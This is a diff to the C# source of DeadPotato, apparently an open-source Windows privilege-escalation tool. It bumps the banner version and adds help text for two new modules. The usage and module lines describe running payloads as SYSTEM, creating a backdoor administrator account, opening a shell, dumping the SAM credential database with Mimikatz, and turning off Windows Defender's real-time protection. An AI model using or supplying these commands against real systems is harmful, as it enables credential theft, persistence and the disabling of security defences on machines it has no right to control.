@@ -88,7 +88,7 @@ namespace DeadPotato
     ⣴⣿⣿⣿⣿⣿⣿⣦   <darkred>| \ _  _  _||_) _ _|_ _ _|_ _ </darkred>
     ⣿⣿⣿⣿⣿⣿⣿⣿   <darkred>|_/(/_(_|(_||  (_) |_(_| |_(_)</darkred>
     ⣇⠈⠉⡿⢿⠉⠁⢸   Open Source @ github.com/<white>lypd0</white>
-    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version <green>b1.0</green> =-       
+    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version: <green>1.1</green> =-       
     ⠀⠀⠀⠈⠁⠀⠀⠀
 
 _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_
@@ -102,6 +102,8 @@ _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_
    -> deadpotato.exe -exe paylod.exe
    -> deadpotato.exe -newadmin lypd0:DeadPotatoRocks1
    -> deadpotato.exe -shell
+   -> deadpotato.exe -mimisam
+   -> deadpotato.exe -defender off
 
  (<darkred>*</darkred>) Available Modules:
    
@@ -110,7 +112,8 @@ _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_
    - exe: Execute a program with NT AUTHORITY\SYSTEM privileges (Does not support interactivity).
    - newadmin: Create a new administrator user on the local system.
    - shell: Manages to achieve a semi-interactive shell (NOTE: Very bad OpSec!)
-
+   - mimisam: Attempts to dump the SAM database with Mimikatz. (NOTE: This will write mimikatz to disk!)
+   - defender: Either enables or disables Windows Defender's real-time protection.
 ");
 
         }
@@ -123,7 +126,7 @@ _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_
     ⣴⣿⣿⣿⣿⣿⣿⣦   <darkred>| \ _  _  _||_) _ _|_ _ _|_ _ </darkred>
     ⣿⣿⣿⣿⣿⣿⣿⣿   <darkred>|_/(/_(_|(_||  (_) |_(_| |_(_)</darkred>
     ⣇⠈⠉⡿⢿⠉⠁⢸   Open Source @ github.com/<white>lypd0</white>
-    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version <green>b1.0</green> =-       
+    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version: <green>1.1</green> =-       
     ⠀⠀⠀⠈⠁⠀⠀⠀
 
 _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_
